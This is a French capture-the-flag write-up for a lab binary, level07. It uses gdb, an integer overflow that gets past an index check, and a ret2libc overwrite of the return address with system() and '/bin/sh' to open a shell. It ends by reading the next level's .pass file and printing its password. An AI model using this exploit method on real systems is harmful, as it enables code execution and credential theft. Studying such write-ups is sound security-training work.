# Ret2Libc Exploitation

En décompilant l'exécutable et en le lançant, on remarque qu'il attend une série de commandes en entrée standard :
```
> ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------
```

## Description des commandes

### `store`

Stocke un nombre dans un `buffer` à un index donné. On le vérifie simplement depuis le code source de la fonction `store_number` :
```c
printf(" Number: ");
uVar1 = get_unum();
printf(" Index: ");
uVar2 = get_unum();
if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    uVar3 = 1;
} else {
    *(uint32_t *)(uVar2 * 4 + arg_8h) = uVar1;
    uVar3 = 0;
}
```
Le `buffer` utilisé est celui déclaré dans la fonction `main`.
```
undefined4 auStack444 [100];
```
On peut également le vérifier en affichant le `buffer` avec `gdb`. On `break` juste après l'appel à la fonction `store_number`.
```
> gdb level07
[...]
> (gdb) disas main
[...]
   0x080488e3 <+448>:	lea    0x24(%esp),%eax
   0x080488e7 <+452>:	mov    %eax,(%esp)
   0x080488ea <+455>:	call   0x8048630 <store_number>
   0x080488ef <+460>:	mov    %eax,0x1b4(%esp)
   0x080488f6 <+467>:	jmp    0x8048965 <main+578>
[...]
> (gdb) b *0x080488ef
Breakpoint 1 at 0x80488ef
```
On lance le programme et on va stocker le nombre `1111` (`0x457` en base 16) à l'index `1`.
```
> (gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 1111
 Index: 1

Breakpoint 1, 0x080488ef in main ()
```
On affiche la `stack` à partir de `esp` pour afficher notre `buffer`.
```
> (gdb) x/20wx $esp
0xffffd100:	0xffffd124	0x00000014	0xf7fcfac0	0xf7fdc714
                     ^
                     adresse du buffer
0xffffd110:	0x00000098	0xffffffff	0xffffd3e4	0xffffd388
0xffffd120:	0x00000000	0x00000000	0x00000457	0x00000000
                                             ^
                                             1111
0xffffd130:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd140:	0x00000000	0x00000000	0x00000000	0x00000000
```
On confirme alors ici le rôle de la commande `store`.

### `read`

La commande `read` va nous permettre de lire un nombre stocké à un index. Après avoir stocké le nombre `1111` à l'index `1` dans notre `buffer`, nous pouvons l'afficher avec la commande `read`.
```
> (gdb) c
Continuing.
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 1111
 Completed read command successfully
```

### `quit`

La commande `quit` va nous faire `break` de la boucle infinie qui demande une commande à l'utilisateur. Le programme se terminera par la suite.
```
Input command: quit
[Inferior 1 (process 1813) exited normally]
```

## Objectif

La commande `store` ne vérifie pas l'index entré par l'utilisateur. On peut donc écrire un nombre plus loin que le `buffer`. Idéal pour écraser `eip` et faire un exploit `Ret2libc`.

## Problème

La fonction `store_number` impose 2 limites à la valeur de l'index :
```c
printf(" Number: ");
uVar1 = get_unum();
printf(" Index: ");
uVar2 = get_unum();
if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
    [Error]
} else {
    [Store number]
}
```
- la valeur de l'index modulo `3` ne doit pas être égale à `0`.
- le premier octet du nombre stocké ne doit pas être égal à `0xb7`.

En incrémentant la valeur de l'index de `1`, on remarque que le programme stocke le nombre 4 octets plus loin. En effet au moment de copier le nombre dans la mémoire, le programme effectue une multiplication par `4` de l'index.
```
*(uint32_t *)(uVar2 * 4 + arg_8h) = uVar1;
                      ^
                      multiplication par 4
                      de l'index
```
En comparant les adresses du `buffer` et de `eip`, on remarque que nous devons écrire un nombre à l'index `114` afin d'écraser `eip`.
```
> (gdb) x $ebp+0x04
0xffffd2ec:	0xf7e45513
> (gdb) x/124wx $esp
0xffffd100:	0xffffd124	0x00000014	0xf7fcfac0	0xf7fdc714
                     ^
                     adresse du buffer
0xffffd110:	0x00000098	0xffffffff	0xffffd3e4	0xffffd388
0xffffd120:	0x00000000	0x00000000	0x00000457	0x00000000
                                             ^
                                             1111
0xffffd130:	0x00000000	0x00000000	0x00000000	0x00000000
[...]
0xffffd2a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd2b0:	0x00000000	0x00000001	0x726f7473	0x00000065
0xffffd2c0:	0x00000000	0x00000000	0x00000000	0x14fa5e00
0xffffd2d0:	0xf7feb620	0x00000000	0x08048a09	0xf7fceff4
0xffffd2e0:	0x00000000	0x00000000	0x00000000	0xf7e45513
                                                         ^
                                                         eip
```
```
index = [adresse_eip] - [adresse_buffer]
      = 0xffffd2ec - 0xffffd124
      = 0x72
      = 114 (base 10)
```
Or
```
114 % 3 = 0
```
Nous ne pouvons donc pas écrire directement à l'index `114` puisque les limitations de la fonction `store_number` sur l'index nous en empêchent.

## Solution

Les opérations étant effectuées sur des `int_32`, nous pouvons utiliser un `overflow` pour contourner la limitiation du modulo. On se rappelle qu'au moment de l'écriture, le programme effectue une multiplication par `4` de l'index.
```
*(uint32_t *)(uVar2 * 4 + arg_8h) = uVar1;
                      ^
                      multiplication par 4
                      de l'index
```
En mettant comme index la valeur de l'`int_max` divisée par `4`, on tombe alors sur l'index `0`. Ainsi, nous pouvons retrouver notre adresse de cette manière :
```
input = [int_max] / 4 + 114
      = 4294967296 / 4 + 114
      = 1073741938
```
On peut le vérifier en lançant le programme :
```
> ./level07 
[...]
Input command: store
 Number: 1111
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 1111
 Completed read command successfully
```
La commande `store` n'a pas échoué et la commande `read` nous confirme que notre nombre a été stocké à l'index `114`. Nous pouvons donc maintenant écraser l'adresse de `eip`.

## Exploit

Comme tout exploit `Ret2libc`, nous devons au préalable trouver l'adresse de `system` ainsi que de `/bin/sh`. On utilise `gdb` :
```
> gdb level07
[...]
> (gdb) b main
Breakpoint 1 at 0x8048729
> (gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
```

---

**Adresse de `system`**

```
> (gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
L'adresse de `system` est `0xf7e6aed0` (`4159090384` en base 10).

**Adresse de `/bin/sh`**

```
> (gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```
L'adresse de `/bin/sh` est `0xf7f897ec` (`4160264172` en base 10).

---

Il ne nous reste qu'à remplacer l'adresse de `eip` (index `114`) par l'adresse de `system` ; puis l'adresse de `eip+0x08` (index `116`) par l'adresse de `/bin/sh`.

```
> ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
